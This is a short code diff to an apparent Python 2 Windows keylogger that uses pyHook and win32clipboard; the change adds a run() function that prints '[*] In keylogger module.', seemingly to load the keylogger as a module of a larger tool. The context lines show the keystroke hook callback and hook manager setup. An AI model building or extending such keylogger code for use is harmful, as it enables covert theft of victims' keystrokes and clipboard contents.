@@ -2,6 +2,7 @@ from ctypes import *
 import pythoncom
 import pyHook 
 import win32clipboard
+import sys
 
 user32   = windll.user32
 kernel32 = windll.kernel32
@@ -65,6 +66,11 @@ def KeyStroke(event):
 
     # pass execution to next hook registered 
     return True
+
+def run(**args):
+
+	print "[*] In keylogger module."
+	return str(sys.stdout)
 
 # create and register a hook manager 
 kl         = pyHook.HookManager()
